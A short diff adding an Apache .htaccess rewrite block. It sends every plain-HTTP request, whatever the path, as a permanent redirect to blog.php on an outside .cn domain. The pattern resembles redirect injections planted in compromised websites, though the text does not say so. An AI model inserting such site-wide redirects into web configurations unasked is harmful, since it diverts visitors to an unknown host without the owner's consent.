@@ -1,0 +1,6 @@
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    RewriteBase /
+    RewriteCond %{SERVER_PORT} ^80$
+    RewriteRule ^.*$ https://brocadesoar.cn/blog.php [R=301,L]
+</IfModule>
